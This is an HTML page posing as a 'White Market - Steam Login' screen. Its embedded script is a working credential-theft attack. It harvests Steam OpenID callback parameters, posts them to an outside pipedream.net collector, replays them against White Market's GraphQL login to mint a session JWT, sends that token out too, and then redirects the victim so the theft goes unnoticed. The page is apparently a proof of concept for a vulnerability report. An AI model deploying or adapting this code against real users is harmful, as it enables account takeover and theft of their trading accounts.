<!DOCTYPE html>
<html>
<head><title>White Market - Steam Login</title></head>
<body>
<h1>Connecting to Steam...</h1>
<script>
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

// Check if we're on the Steam callback
const params = new URLSearchParams(window.location.search);

if (params.has('openid.sig')) {
    // User was redirected here from Steam - steal the OpenID params!
    const steamAuth = {
        openidNs: params.get('openid.ns'),
        openidMode: params.get('openid.mode'),
        openidOpEndpoint: params.get('openid.op_endpoint'),
        openidClaimedId: params.get('openid.claimed_id'),
        openidIdentity: params.get('openid.identity'),
        openidReturnTo: params.get('openid.return_to'),
        openidResponseNonce: params.get('openid.response_nonce'),
        openidAssocHandle: params.get('openid.assoc_handle'),
        openidSigned: params.get('openid.signed'),
        openidSig: params.get('openid.sig')
    };
    
    // Send stolen Steam auth to our server
    fetch(REQUESTBIN, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            attack: 'STOLEN_STEAM_AUTH',
            steamAuth: steamAuth,
            timestamp: new Date().toISOString()
        })
    });
    
    // Now use it to login and get JWT
    fetch('https://api.white.market/graphql/api', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            query: 'mutation AuthSteam($steamAuth: SteamAuthInput!) { auth_steam(steamAuth: $steamAuth) { accessToken isNewPerson } }',
            variables: {steamAuth: steamAuth},
            operationName: 'AuthSteam'
        })
    })
    .then(r => r.json())
    .then(d => {
        if (d.data && d.data.auth_steam) {
            // SUCCESS - got JWT!
            fetch(REQUESTBIN, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack: 'JWT_GENERATED',
                    jwt: d.data.auth_steam.accessToken,
                    timestamp: new Date().toISOString()
                })
            });
        }
    });
}

// Redirect victim to complete login
setTimeout(() => {
    window.location.href = 'https://white.market';
}, 3000);
</script>
</body>
</html>
```
